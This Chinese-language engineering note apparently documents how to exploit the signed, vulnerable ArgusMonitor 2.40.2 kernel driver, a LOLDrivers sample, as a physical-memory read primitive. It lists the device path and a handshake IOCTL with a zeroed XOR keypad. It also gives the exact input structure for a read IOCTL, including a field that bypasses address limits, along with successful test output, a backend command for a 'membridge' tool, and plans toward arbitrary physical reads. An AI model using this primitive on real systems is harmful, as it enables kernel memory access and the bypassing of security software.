# ArgusMonitor 2.40.2：handshake + single-shot 物理读协议

## 样本
来源：LOLDrivers 记录的易受攻击样本。

```
SHA256 = DF9B2892498C68805FDC0FABB369F8BCF011E784898CB32FDC5D85F6123F1126
大小   = 71864
签名   = Valid
发布者 = Microsoft Windows Hardware Compatibility Publisher
```

保存：
```
drivers/argusmonitor_new/ArgusMonitor_2.40.2.sys
```

## 设备
```
\\.\ArgusMonitorCTLD -> OPEN_OK
```

## Handshake
IOCTL：
```
0x9C402B74
输入 = 0x200 字节全零（XOR keypad 清零）
输出 = 0x210 字节
```
实测：
```
handshake_ok=True
ret=0x210
```
说明零 keypad 被接受，XOR 层关闭。

## Single-shot 物理读
IOCTL：
```
0x9C402994
```

输入结构 32 字节：

```c
struct {
    uint64_t pa;          // offset 0
    uint32_t busNum;      // offset 8  = 0xFF  // 绕过地址限制
    uint32_t width;       // offset 12 = 1
    uint8_t  pad[14];     // offset 16..29 清零
    uint16_t checksum;    // offset 30，前 30 字节的 16-bit 加法和，大端
};
```

输出 24 字节，偏移 0 处的 DWORD 为读取值。

实测：
```
pa=0x1000
=> READ_OK
=> E9 4D 06 00 01 00 00 00 01 00 00 00 3F 00 18 10
```
与 GLCKIO2 在同一 PA 的基线一致。

## 已接入 backend
```
membridge --backend argusmonitor --no-load --pa 0x1000 --size 0x10 --dump
=> VERDICT=PASS
```
实现位置：
```
src/membridge.c -> read_argus()
```

## 当前限制
- PA=0x1000 PASS；
- 读取 CR3 页 `0x367C7000` 返回：
```
[ERR] argus single-shot read err=31
```
- 说明 `0x9C402994` 的参数/宽度/地址约束仍未完全确定；
- 暂不计入“已验证任意 PA 读”；
- 后续需要修正结构或尝试 map 类 IOCTL（`0x9C403A54` / `0x9C403AD0`）。

## 参考
- LOLDrivers: https://www.loldrivers.io/drivers/08fbd284-7ad2-466d-b55f-6d5a7d07aca5/
- Issue #297: https://github.com/magicsword-io/LOLDrivers/issues/297
